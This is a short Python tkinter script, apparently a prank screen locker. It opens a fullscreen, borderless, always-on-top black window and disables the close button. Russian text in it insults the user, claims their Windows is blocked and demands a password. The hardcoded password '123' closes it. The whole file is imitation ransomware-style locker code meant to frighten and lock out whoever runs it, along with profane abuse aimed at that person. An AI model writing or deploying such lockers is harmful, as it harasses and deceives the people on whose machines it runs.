from tkinter import *

root = Tk()

def quit():
    pass

def CheckPassword(event):
    if Password.get() == "123":  
        exit()  

x = root.winfo_screenwidth()  
y = root.winfo_screenheight()  

bg = "black"
font = "Arial 25 bold"  

root["bg"] = bg
root.protocol("WM_DELETE_WINDOW", quit)
root.attributes("-topmost", 1)
root.geometry(f"{x}x{y}")
root.overrideredirect(1)

Label(text="Ха лох твоя винда блокнута", fg="red", bg=bg, font=font).pack()
Label(text="\n\n\n\nВведи пароль еблан", fg="white", bg=bg, font=font).pack()

Password = Entry(font=font)
Password.pack()
Password.bind("<Return>", CheckPassword)

root.mainloop()
